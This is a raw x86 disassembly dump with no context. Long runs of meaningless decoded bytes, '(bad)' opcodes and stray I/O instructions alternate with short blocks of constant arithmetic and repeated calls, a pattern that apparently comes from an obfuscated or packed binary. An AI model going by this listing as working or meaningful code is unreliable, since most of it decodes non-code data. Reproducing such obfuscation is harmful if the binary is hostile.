  40dd0e:	sahf   
  40dd0f:	or     eax,0x7dfafa27
  40dd14:	mov    dl,0x80
  40dd16:	sbb    al,0xe7
  40dd18:	xchg   esp,eax
  40dd19:	shl    DWORD PTR [edx+ebp*2-0x6e],cl
  40dd1d:	inc    edi
  40dd1e:	adc    edi,ecx
  40dd20:	cmp    al,0xdf
  40dd22:	mul    DWORD PTR [esi-0x49383b41]
  40dd28:	mov    ecx,0xad726c70
  40dd2d:	dec    ecx
  40dd2e:	cmp    al,0x83
  40dd30:	cmp    BYTE PTR [ecx],al
  40dd32:	(bad)  
  40dd33:	fldenv [esi]
  40dd35:	test   eax,0x64caabab
  40dd3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3b:	xchg   edx,eax
  40dd3c:	pop    es
  40dd3d:	int3   
  40dd3e:	push   ecx
  40dd3f:	cmp    ah,dh
  40dd41:	add    eax,0x4e59af17
  40dd46:	in     al,0x45
  40dd48:	and    al,0x74
  40dd4a:	stos   BYTE PTR es:[edi],al
  40dd4b:	mov    ebp,0x7c9d7155
  40dd50:	dec    edx
  40dd51:	add    esp,DWORD PTR [ecx-0x75]
  40dd54:	pop    ebp
  40dd55:	sub    al,0xe4
  40dd57:	fbstp  TBYTE PTR [edx+0x12bc6e36]
  40dd5d:	jmp    0x349d:0x36663e33
  40dd64:	ror    edx,0xee
  40dd67:	xchg   BYTE PTR [edi],ch
  40dd69:	jecxz  0x40dd93
  40dd6b:	jo     0x40ddba
  40dd6d:	ins    BYTE PTR es:[edi],dx
  40dd6e:	mov    bh,0x16
  40dd70:	push   0x7f2f5394
  40dd75:	pusha  
  40dd76:	fst    QWORD PTR [edx+0x196269ce]
  40dd7c:	int3   
  40dd7d:	imul   edi,eax,0x72
  40dd80:	loop   0x40ddf8
  40dd82:	or     dh,BYTE PTR [edx]
  40dd84:	adc    DWORD PTR [edx-0x51],0xffffff97
  40dd88:	ret    
  40dd89:	add    ebx,DWORD PTR [esi]
  40dd8b:	sar    DWORD PTR [edx],1
  40dd8d:	shl    BYTE PTR [esi+0xfa19613],1
  40dd93:	pop    DWORD PTR [eax]
  40dd95:	bound  esp,QWORD PTR [ecx]
  40dd97:	out    dx,al
  40dd98:	and    dl,BYTE PTR [edi+0x51c3be75]
  40dd9e:	idiv   BYTE PTR [edx]
  40dda0:	or     BYTE PTR [ebx],0x32
  40dda3:	std    
  40dda4:	jecxz  0x40dd3f
  40dda6:	enter  0x88e5,0x87
  40ddaa:	in     al,dx
  40ddab:	rcr    DWORD PTR [eax+0x45],cl
  40ddae:	mov    ebp,0x7b680111
  40ddb3:	fadd   DWORD PTR [eax]
  40ddb5:	in     al,dx
  40ddb6:	repz mov ebx,0xc50e4ba7
  40ddbc:	mov    ah,0x5f
  40ddbe:	dec    esp
  40ddbf:	xor    ah,BYTE PTR [ecx+ebp*2-0x2e]
  40ddc3:	mov    ?,eax
  40ddc5:	mov    dl,0xbb
  40ddc7:	fsubr  QWORD PTR fs:[edx+0x3c5eeac9]
  40ddce:	fdiv   QWORD PTR [ebx-0x4c]
  40ddd1:	xchg   ecx,eax
  40ddd2:	popa   
  40ddd3:	jg     0x40de00
  40ddd5:	push   ecx
  40ddd6:	mov    bh,0x77
  40ddd8:	out    dx,al
  40ddd9:	addr16 or eax,0x2673d06f
  40dddf:	mov    ds:0x53910361,eax
  40dde4:	xor    DWORD PTR [edx+0x60],eax
  40dde7:	and    dl,BYTE PTR [esi+0x3c0a0732]
  40dded:	inc    edi
  40ddee:	or     al,0xa6
  40ddf0:	jecxz  0x40dd93
  40ddf2:	aas    
  40ddf3:	rol    BYTE PTR [ebx-0x6eea9d9d],0xac
  40ddfa:	jnp    0x40ddf9
  40ddfc:	fs jo  0x40de1e
  40ddff:	push   0xffffff96
  40de01:	xchg   ecx,eax
  40de02:	jnp    0x40de1c
  40de04:	mov    bl,0xd2
  40de06:	leave  
  40de07:	jmp    0xc518:0x621ee54b
  40de0e:	loopne 0x40ddfd
  40de10:	push   0xc71a08f3
  40de15:	test   al,0x52
  40de17:	or     cl,BYTE PTR [edx+0x72]
  40de1a:	push   ebp
  40de1b:	add    al,0xd1
  40de1d:	out    dx,al
  40de1e:	pop    ecx
  40de1f:	pop    esp
  40de20:	mul    BYTE PTR [ecx]
  40de22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de23:	jecxz  0x40ddff
  40de25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de26:	inc    edi
  40de27:	jo     0x40de7a
  40de29:	adc    ecx,0xd1d64fcf
  40de2f:	xor    BYTE PTR [edx],0x5e
  40de32:	push   edi
  40de33:	enter  0xe593,0xe2
  40de37:	inc    ecx
  40de38:	lock inc esi
  40de3a:	jbe    0x40de34
  40de3c:	sub    DWORD PTR [edx+0x55],ebx
  40de3f:	mov    ebx,0xc052a455
  40de44:	and    al,0x1b
  40de46:	mov    dl,0xe9
  40de48:	loop   0x40deb8
  40de4a:	or     eax,0xb0525049
  40de4f:	mov    ch,0xd0
  40de51:	or     eax,0x470c9037
  40de56:	sar    BYTE PTR [esp+ecx*4-0x4c],cl
  40de5a:	stos   BYTE PTR es:[edi],al
  40de5b:	xlat   BYTE PTR ds:[ebx]
  40de5c:	lock out 0x1,al
  40de5f:	mov    al,0x4b
  40de61:	dec    ecx
  40de62:	cmp    cl,bh
  40de64:	add    ecx,DWORD PTR [edi-0x25438b67]
  40de6a:	jle    0x40dede
  40de6c:	and    esi,DWORD PTR [ebp+ebp*8+0x3b]
  40de70:	ins    BYTE PTR es:[edi],dx
  40de71:	cwde   
  40de72:	mov    ah,0x86
  40de74:	sbb    ch,0xb8
  40de77:	or     eax,DWORD PTR [edi-0x52]
  40de7a:	shl    DWORD PTR [edx-0x5bef805e],cl
  40de80:	and    BYTE PTR [esi],cl
  40de82:	sbb    al,0xc6
  40de84:	cmp    esi,DWORD PTR [edi]
  40de86:	xchg   esi,eax
  40de87:	sbb    al,0xec
  40de89:	and    BYTE PTR [edx],dl
  40de8b:	(bad)  
  40de8c:	xchg   edi,eax
  40de8d:	gs pushf 
  40de8f:	inc    ebx
  40de90:	jg     0x40de85
  40de92:	mov    al,0xc2
  40de94:	arpl   WORD PTR [eax+0xc9598],bx
  40de9a:	mov    cs,WORD PTR [edx-0x4de82b6c]
  40dea0:	mov    edx,0x2c77fde1
  40dea5:	xchg   BYTE PTR [eax+ebx*1+0x45c7796e],cl
  40deac:	call   0x4130fe
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x422283
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	mov    ch,0x75
  40df1c:	bound  ebx,QWORD PTR [esi-0x414103ea]
  40df22:	cdq    
  40df23:	ret    0xbebe
  40df26:	ja     0x40dec2
  40df28:	pop    ebx
  40df29:	mov    eax,ebx
  40df2b:	jg     0x40df74
  40df2d:	push   edi
  40df2e:	or     cl,BYTE PTR [ebp-0x20]
  40df31:	mov    bh,0x9d
  40df33:	xor    DWORD PTR [ebx-0x7ae72644],edi
  40df39:	js     0x40ded3
  40df3b:	js     0x40df5a
  40df3d:	loopne 0x40df71
  40df3f:	sub    BYTE PTR [edi-0x17],dl
  40df42:	repz mov dl,BYTE PTR [ebx-0x5ca0866a]
  40df49:	jbe    0x40df03
  40df4b:	jns    0x40df63
  40df4d:	jge    0x40df55
  40df4f:	fisub  DWORD PTR [ebx+eax*8-0x73]
  40df53:	popa   
  40df54:	add    ch,BYTE PTR ds:0xc61307ae
  40df5a:	mov    ds:0x589c1f71,eax
  40df5f:	aad    0xd
  40df61:	adc    al,0x63
  40df63:	mov    edx,0x4c0dc718
  40df68:	mov    bl,BYTE PTR [edx+esi*2+0x4263ca40]
  40df6f:	and    eax,0x3d8b430e
  40df74:	loopne 0x40df2f
  40df76:	jnp    0x40dfdd
  40df78:	popa   
  40df79:	das    
  40df7a:	and    dh,0x29
  40df7d:	fcomi  st,st(5)
  40df7f:	dec    esi
  40df80:	ds inc edx
  40df82:	mov    bl,0x38
  40df84:	or     ebx,DWORD PTR [eax]
  40df86:	mov    cl,0x58
  40df88:	into   
  40df89:	stc    
  40df8a:	mov    gs,WORD PTR [edi-0x49]
  40df8d:	ins    DWORD PTR es:[edi],dx
  40df8e:	and    BYTE PTR [edi+0x16c7d138],0x5e
  40df95:	les    eax,FWORD PTR [edi]
  40df97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df98:	mov    ah,0x4
  40df9a:	mov    bh,0x39
  40df9c:	pop    ebp
  40df9d:	xor    esp,esi
  40df9f:	bound  ebx,QWORD PTR [esi]
  40dfa1:	and    DWORD PTR [edi-0x4884d4a9],ebx
  40dfa7:	mov    DWORD PTR [edi+0x4a672e0],ebx
  40dfad:	sub    al,0x1
  40dfaf:	stos   BYTE PTR es:[edi],al
  40dfb0:	push   ebx
  40dfb1:	rcl    BYTE PTR [ecx+0x26],0xed
  40dfb5:	sbb    BYTE PTR [ecx],0xa8
  40dfb8:	dec    esp
  40dfb9:	loop   0x40e009
  40dfbb:	pop    esp
  40dfbc:	or     DWORD PTR [ebx+0x5e],edx
  40dfbf:	clc    
  40dfc0:	rol    ebx,0x4f
  40dfc3:	mov    eax,0xfa1b1d53
  40dfc8:	mov    ds:0x5627a78f,al
  40dfcd:	jle    0x40df9f
  40dfcf:	cmp    DWORD PTR [ebx-0x5dfa675b],esp
  40dfd5:	push   ecx
  40dfd6:	inc    eax
  40dfd7:	sbb    dh,ch
  40dfd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfda:	mov    WORD PTR [edi],?
  40dfdc:	in     eax,0xaa
  40dfde:	sub    ch,bl
  40dfe0:	sub    BYTE PTR [ebx],0x73
  40dfe3:	add    esp,DWORD PTR [ebx-0x6b]
  40dfe6:	and    eax,DWORD PTR ds:0xd5bf4f90
  40dfec:	cwde   
  40dfed:	mov    esp,0xd9a37280
  40dff2:	ficomp DWORD PTR [edx+ecx*1+0x296d9a74]
  40dff9:	call   edi
  40dffb:	inc    esi
  40dffc:	loop   0x40e004
  40dffe:	mov    eax,0x50a33c38
  40e003:	and    BYTE PTR [ebx+eax*2-0x20],ch
  40e007:	jp     0x40e030
  40e009:	dec    eax
  40e00a:	sbb    dl,BYTE PTR [edx]
  40e00c:	xor    dh,bh
  40e00e:	mov    BYTE PTR [esi+0x142b86ca],cl
  40e014:	les    esi,FWORD PTR [eax+0xd]
  40e017:	lea    edx,[eax+0x34ee1073]
  40e01d:	enter  0x9f7d,0x2f
  40e021:	cmp    ebx,DWORD PTR [ebx+0x600451c1]
  40e027:	push   ecx
  40e028:	scas   eax,DWORD PTR es:[edi]
  40e029:	cli    
  40e02a:	sbb    ch,cl
  40e02c:	in     eax,0x35
  40e02e:	mov    cl,0x9f
  40e030:	mov    ebx,ecx
  40e032:	mov    esi,0x3b273750
  40e037:	sbb    edx,DWORD PTR [ecx+0x76]
  40e03a:	mov    bl,0x10
  40e03c:	push   esi
  40e03d:	pop    ss
  40e03e:	leave  
  40e03f:	mov    ch,0xf2
  40e041:	push   0x909dfb4f
  40e046:	add    dl,BYTE PTR [ecx-0x68]
  40e049:	inc    edi
  40e04a:	es push edi
  40e04c:	retf   0xc485
  40e04f:	pop    edi
  40e050:	lea    esi,[esi-0x39058a33]
  40e056:	out    0xd9,eax
  40e058:	sbb    BYTE PTR [ebx],0x3d
  40e05b:	or     BYTE PTR [edi],dl
  40e05d:	popf   
  40e05e:	or     DWORD PTR [eax+0xf],0x11
  40e062:	mov    esi,0x89001c8a
  40e067:	fdecstp 
  40e069:	xchg   eax,esp
  40e06b:	and    edi,0x1299e71e
  40e071:	adc    ebx,DWORD PTR [eax+eax*1+0x8]
  40e075:	xor    DWORD PTR [ecx+ebx*8],ebx
  40e078:	les    edi,FWORD PTR [eax]
  40e07a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e07b:	setl   BYTE PTR [eax+0x3c25ccb0]
  40e082:	scas   al,BYTE PTR es:[edi]
  40e083:	add    ecx,ebx
  40e085:	les    ebp,FWORD PTR [ebp-0x6c]
  40e088:	(bad)  
  40e08a:	lods   al,BYTE PTR ds:[esi]
  40e08b:	pop    esp
  40e08c:	jle    0x40e076
  40e08e:	stc    
  40e08f:	pop    esp
  40e090:	jns    0x40e04e
  40e092:	sahf   
  40e093:	push   esp
  40e094:	(bad)  [eax+ecx*2+0x10]
  40e098:	cmc    
  40e099:	jge    0x40e0b7
  40e09b:	inc    esi
  40e09c:	iret   
  40e09d:	jne    0x40e0c9
  40e09f:	xor    edi,DWORD PTR [ebp+eax*4+0x3723725e]
  40e0a6:	mov    ch,0xfc
  40e0a8:	jmp    0xf159846a
  40e0ad:	lods   al,BYTE PTR ds:[esi]
  40e0ae:	mov    bl,0xa8
  40e0b0:	aam    0x90
  40e0b2:	adc    al,0xee
  40e0b4:	aas    
  40e0b5:	sub    ebp,edi
  40e0b7:	mov    edx,0x4fb9dca2
  40e0bc:	cwde   
  40e0bd:	cs jl  0x40e0e8
  40e0c0:	pusha  
  40e0c1:	mov    edx,?
  40e0c3:	lea    ecx,[ebp+0x1e58e0c7]
  40e0c9:	sar    DWORD PTR cs:[edi+0x5bae1333],cl
  40e0d0:	mov    dh,0xdd
  40e0d2:	lahf   
  40e0d3:	outs   dx,BYTE PTR ds:[esi]
  40e0d4:	rcr    DWORD PTR [ecx],1
  40e0d6:	add    eax,0xde96aaa4
  40e0db:	jmp    0x3fa844ac
  40e0e0:	repnz sbb al,0xb7
  40e0e3:	xchg   esp,eax
  40e0e4:	adc    BYTE PTR [edx-0x6b],bh
  40e0e7:	jb     0x40e08c
  40e0e9:	fistp  WORD PTR [edi+0x41dbb378]
  40e0ef:	les    ebx,FWORD PTR [eax-0x24be61be]
  40e0f5:	adc    eax,0xfc1c7a46
  40e0fa:	mov    edi,0x1b0cc4a
  40e0ff:	and    DWORD PTR [ebx],esp
  40e101:	imul   ebp
  40e103:	sahf   
  40e104:	push   ebx
  40e105:	rol    DWORD PTR [edi-0x1d894a68],cl
  40e10b:	ror    eax,1
  40e10d:	inc    esi
  40e10e:	shr    BYTE PTR [ebx-0x78ad28e0],1
  40e114:	xchg   ebx,eax
  40e115:	mov    dh,0xb2
  40e117:	xchg   DWORD PTR [edx-0x16],esi
  40e11a:	out    dx,eax
  40e11b:	push   es
  40e11c:	pushf  
  40e11d:	xchg   esi,eax
  40e11e:	arpl   bp,sp
  40e120:	loopne 0x40e177
  40e122:	rol    DWORD PTR [esi+0x532db8fb],cl
  40e128:	add    al,0x3a
  40e12a:	pop    ebp
  40e12b:	aaa    
  40e12c:	into   
  40e12d:	ins    BYTE PTR es:[edi],dx
  40e12e:	and    al,0x6
  40e130:	mov    edi,0x9db6eacc
  40e135:	addr16 mov al,0xa5
  40e138:	fdiv   DWORD PTR [esi+0x7c76c179]
  40e13e:	cmp    dh,bh
  40e140:	fs sbb al,0x9d
  40e143:	sti    
  40e144:	in     al,dx
  40e145:	mov    dh,BYTE PTR [edi+edx*2]
  40e148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e149:	xor    cl,BYTE PTR [ecx]
  40e14b:	mov    ecx,0x3002fca1
  40e150:	pop    eax
  40e151:	loope  0x40e180
  40e153:	cmp    al,0x6c
  40e155:	ret    
  40e156:	cmp    BYTE PTR [eax+0x4b4001f7],bl
  40e15c:	pop    es
  40e15d:	xchg   esp,eax
  40e15e:	mov    edi,0x23f9e137
  40e163:	loop   0x40e185
  40e165:	xchg   ebx,eax
  40e166:	jl     0x40e18c
  40e168:	scas   eax,DWORD PTR es:[edi]
  40e169:	mov    ds:0x3312bc64,eax
  40e16e:	out    dx,al
  40e16f:	cld    
  40e170:	mov    ch,0x8d
  40e172:	cli    
  40e173:	(bad)  
  40e174:	popa   
  40e175:	jo     0x40e1e7
  40e177:	mov    BYTE PTR ds:0x9a3c663,ch
  40e17d:	lahf   
  40e17e:	sbb    eax,0xdeaf3afe
  40e183:	addr16 in eax,0x29
  40e186:	call   0xd5e:0xe5819ed7
  40e18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e18e:	pop    eax
  40e18f:	jp     0x40e121
  40e191:	into   
  40e192:	jmp    0x40e17d
  40e194:	push   esp
  40e195:	sub    BYTE PTR [ecx-0x38f9761e],ch
  40e19b:	inc    ebp
  40e19c:	loopne 0x40e1f2
  40e19e:	xor    eax,DWORD PTR [eax]
  40e1a0:	add    bh,al
  40e1a2:	inc    ebp
  40e1a3:	in     al,0x8c
  40e1a5:	jge    0x40e1a7
  40e1a7:	add    bh,al
  40e1a9:	inc    ebp
  40e1aa:	call   0x411ee5
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	hlt    
  40e1d6:	inc    edx
  40e1d7:	out    0xe3,eax
  40e1d9:	icebp  
  40e1da:	add    bh,BYTE PTR [esi-0x413d6642]
  40e1e0:	mov    esi,0x945fe73e
  40e1e5:	pushf  
  40e1e6:	addr16 mov ds:0xb037,al
  40e1ea:	jnp    0x40e176
  40e1ec:	push   0x8ab56aec
  40e1f1:	pop    es
  40e1f2:	mov    esp,0x3b6d831
  40e1f7:	mov    esi,0xa208b26c
  40e1fc:	and    eax,0xcb3dda10
  40e201:	mov    ecx,0x50816463
  40e206:	inc    edi
  40e207:	xor    eax,DWORD PTR [ebx-0x3b6981b9]
  40e20d:	scas   eax,DWORD PTR es:[edi]
  40e20e:	push   ebx
  40e20f:	sbb    edi,eax
  40e211:	loope  0x40e28e
  40e213:	pop    edx
  40e214:	xor    DWORD PTR [ebx],esi
  40e216:	cmp    ah,cl
  40e218:	jae    0x40e1c1
  40e21a:	rcr    BYTE PTR [esi+0x50],0x9a
  40e21e:	ss out 0x97,al
  40e221:	adc    bh,bl
  40e223:	in     al,0x75
  40e225:	ja     0x40e1e4
  40e227:	jae    0x40e1c6
  40e229:	mov    eax,ds:0x326bcf37
  40e22e:	or     dh,BYTE PTR [edi]
  40e230:	pop    ds
  40e231:	icebp  
  40e232:	pop    es
  40e233:	add    esp,DWORD PTR [eax-0x30]
  40e236:	xchg   BYTE PTR [eax],bl
  40e238:	outs   dx,BYTE PTR ds:[esi]
  40e239:	dec    edi
  40e23a:	data16 sub BYTE PTR [edx+edx*2+0x78],bl
  40e23f:	mov    ebp,0x3e947106
  40e244:	std    
  40e245:	push   ecx
  40e246:	sub    bl,BYTE PTR [edx-0x74b7e5d9]
  40e24c:	adc    DWORD PTR [esp+edx*1],esp
  40e24f:	cdq    
  40e250:	add    BYTE PTR [ecx],cl
  40e252:	rol    BYTE PTR [ecx-0x6ef89b49],0x69
  40e259:	dec    ebx
  40e25a:	aaa    
  40e25b:	outs   dx,DWORD PTR ds:[esi]
  40e25c:	scas   al,BYTE PTR es:[edi]
  40e25d:	xchg   esp,eax
  40e25e:	ins    DWORD PTR es:[edi],dx
  40e25f:	rcl    edx,0xb8
  40e262:	test   BYTE PTR [ecx-0x390eecee],ch
  40e268:	sbb    al,0xd6
  40e26a:	or     eax,0x49cbfc1f
  40e26f:	mov    dh,BYTE PTR [edx-0x14]
  40e272:	jl     0x40e2db
  40e274:	dec    ebx
  40e275:	push   0x32118123
  40e27a:	mov    ebp,0x129476a0
  40e27f:	push   ds
  40e280:	pusha  
  40e281:	sbb    al,dh
  40e283:	and    BYTE PTR [eax],ch
  40e285:	in     eax,0x48
  40e287:	jo     0x40e234
  40e289:	je     0x40e2d4
  40e28b:	cmp    BYTE PTR [edx-0x47],al
  40e28e:	dec    ecx
  40e28f:	ror    DWORD PTR [eax+0x76db1ccc],1
  40e295:	test   al,0xeb
  40e297:	xchg   DWORD PTR [ecx],ebx
  40e299:	adc    al,0xb2
  40e29b:	in     eax,dx
  40e29c:	or     al,ch
  40e29e:	rol    DWORD PTR [edx-0x3614fa74],0x60
  40e2a5:	mov    edx,0xae83d9de
  40e2aa:	inc    ecx
  40e2ab:	mov    bl,0xef
  40e2ad:	mov    esp,0x51f303ef
  40e2b2:	repz je 0x40e242
  40e2b5:	cli    
  40e2b6:	or     ecx,DWORD PTR [eax-0x7]
  40e2b9:	jg     0x40e309
  40e2bb:	sahf   
  40e2bc:	(bad)  
  40e2bd:	adc    BYTE PTR [ebx-0x356e6e8f],bl
  40e2c3:	das    
  40e2c4:	pop    ss
  40e2c5:	std    
  40e2c6:	or     al,BYTE PTR [eax+0x1e]
  40e2c9:	inc    ebx
  40e2ca:	adc    ebp,DWORD PTR [ecx+0x6d9bea61]
  40e2d0:	sahf   
  40e2d1:	fisub  WORD PTR [ebx]
  40e2d3:	pop    ds
  40e2d4:	sbb    edx,DWORD PTR [ebp-0xf]
  40e2d7:	push   edx
  40e2d8:	test   DWORD PTR [esi+0x2],0xc56e36db
  40e2df:	(bad)  
  40e2e0:	adc    ch,BYTE PTR [esi]
  40e2e2:	pushf  
  40e2e3:	or     BYTE PTR [ebx],bh
  40e2e5:	data16 cld 
  40e2e7:	mov    bl,0xb6
  40e2e9:	hlt    
  40e2ea:	lahf   
  40e2eb:	pop    esp
  40e2ec:	xchg   esp,eax
  40e2ed:	push   0xffffff94
  40e2ef:	mov    al,0xf9
  40e2f1:	lahf   
  40e2f2:	dec    esp
  40e2f3:	pop    esi
  40e2f4:	add    ch,BYTE PTR [edx]
  40e2f6:	push   ss
  40e2f7:	mov    edi,0xc45c4942
  40e2fc:	mov    edx,0x8979ec8c
  40e301:	xlat   BYTE PTR ds:[bx]
  40e303:	int3   
  40e304:	push   es
  40e305:	sub    al,0xa5
  40e307:	adc    al,0x29
  40e309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e30a:	mov    edi,0x9816750c
  40e30f:	aaa    
  40e310:	inc    ebp
  40e311:	dec    ebp
  40e312:	add    eax,0x15bece5f
  40e317:	and    eax,0x99f9f315
  40e31c:	outs   dx,BYTE PTR ds:[esi]
  40e31d:	pop    ecx
  40e31e:	ret    
  40e31f:	mov    al,0xb2
  40e321:	push   ebp
  40e322:	xor    DWORD PTR [ebx+ebx*8-0x399851b4],esi
  40e329:	push   ds
  40e32a:	add    bh,BYTE PTR [ecx+0x2a295d9e]
  40e330:	jp     0x40e2e2
  40e332:	or     eax,0x51ac7c33
  40e337:	jo     0x40e2fe
  40e339:	cmp    dl,dh
  40e33b:	call   0x33:0xcb6cb300
  40e342:	jnp    0x40e338
  40e344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e345:	push   DWORD PTR [edi]
  40e347:	xlat   BYTE PTR ds:[ebx]
  40e348:	mov    ebp,0x6c48300a
  40e34d:	dec    esp
  40e34e:	outs   dx,BYTE PTR ds:[esi]
  40e34f:	push   ds
  40e350:	ds out dx,eax
  40e352:	pop    es
  40e353:	sbb    eax,0x20877454
  40e358:	stos   BYTE PTR es:[edi],al
  40e359:	js     0x40e379
  40e35b:	lahf   
  40e35c:	xor    dl,BYTE PTR [esi-0x6e4445d7]
  40e362:	call   DWORD PTR [ebx]
  40e364:	sbb    bh,bh
  40e366:	retf   0xf133
  40e369:	mul    DWORD PTR [edi-0x4e6bd444]
  40e36f:	xchg   edx,eax
  40e370:	push   0x6a611b39
  40e375:	adc    bh,al
  40e377:	inc    edx
  40e378:	outs   dx,DWORD PTR ds:[esi]
  40e379:	rcl    BYTE PTR [ecx+0x4cc9eade],1
  40e37f:	aam    0x55
  40e381:	es cmc 
  40e383:	sub    al,0xbf
  40e385:	mov    fs,edx
  40e387:	or     BYTE PTR [ecx+0x5e],cl
  40e38a:	and    eax,0xc6f2627b
  40e38f:	jle    0x40e3e3
  40e391:	mov    cl,0x73
  40e393:	shr    DWORD PTR [esi],0xe4
  40e396:	add    eax,0x83f8180a
  40e39b:	pop    es
  40e39c:	sbb    bh,BYTE PTR [edi-0x41ad46bd]
  40e3a2:	aaa    
  40e3a3:	ins    DWORD PTR es:[edi],dx
  40e3a4:	into   
  40e3a5:	cs cmp cl,bl
  40e3a8:	imul   ebp,DWORD PTR [ebp+0x10],0x68
  40e3ac:	aas    
  40e3ad:	mov    esp,DWORD PTR [ecx-0x2b]
  40e3b0:	sbb    DWORD PTR [eax-0x411995f8],eax
  40e3b6:	es inc ecx
  40e3b8:	lods   al,BYTE PTR ds:[esi]
  40e3b9:	leave  
  40e3ba:	stc    
  40e3bb:	out    0x11,al
  40e3bd:	lea    edi,ds:0x1d0a8243
  40e3c3:	or     bl,cl
  40e3c5:	je     0x40e443
  40e3c7:	push   edi
  40e3c8:	inc    edi
  40e3c9:	inc    ebx
  40e3ca:	mov    al,ds:0xa0d80b95
  40e3cf:	shl    BYTE PTR [edi+0x6d],cl
  40e3d2:	pusha  
  40e3d3:	lds    ebx,FWORD PTR [ebx-0x306d9d62]
  40e3d9:	outs   dx,BYTE PTR ds:[esi]
  40e3da:	add    eax,0xa139ad44
  40e3df:	shr    DWORD PTR ss:[edx],cl
  40e3e2:	add    BYTE PTR [ecx+0x78],al
  40e3e5:	push   ecx
  40e3e6:	and    al,0x89
  40e3e8:	mov    esp,0x930500e9
  40e3ed:	sub    al,0x87
  40e3ef:	dec    esp
  40e3f0:	call   0xe09:0xa2cf6661
  40e3f7:	in     eax,0x9e
  40e3f9:	or     al,0x17
  40e3fb:	cli    
  40e3fc:	fild   WORD PTR [edi+esi*8]
  40e3ff:	stos   DWORD PTR es:[edi],eax
  40e400:	jle    0x40e39a
  40e402:	jnp    0x40e444
  40e404:	jge    0x40e418
  40e406:	hlt    
  40e407:	data16 and al,0x1e
  40e40a:	popf   
  40e40b:	fldcw  WORD PTR [ebp+ebp*2+0x53]
  40e40f:	cmp    BYTE PTR [edi-0x3992cafb],bh
  40e415:	jne    0x40e3fc
  40e417:	shl    DWORD PTR [eax+ebx*8-0x5424ae1b],cl
  40e41e:	push   es
  40e41f:	loope  0x40e487
  40e421:	adc    al,0xa
  40e423:	dec    edi
  40e424:	mov    ah,0x6d
  40e426:	push   0x21
  40e428:	in     eax,dx
  40e429:	lds    edi,FWORD PTR [edx]
  40e42b:	je     0x40e440
  40e42d:	(bad)  
  40e42f:	or     al,0x23
  40e431:	in     al,0x56
  40e433:	cmp    al,0xc0
  40e435:	xchg   DWORD PTR [edi-0x2c],ebx
  40e438:	js     0x40e4aa
  40e43a:	jnp    0x40e49f
  40e43c:	in     al,dx
  40e43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e43e:	and    eax,0x39c4a52f
  40e443:	xchg   esi,eax
  40e444:	add    al,0xdd
  40e446:	(bad)  
  40e447:	sbb    DWORD PTR [ecx+0x4248d3a0],0xffffffe0
  40e44e:	aad    0x24
  40e450:	push   esp
  40e451:	mov    esp,0x7d894725
  40e456:	cld    
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x422283
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
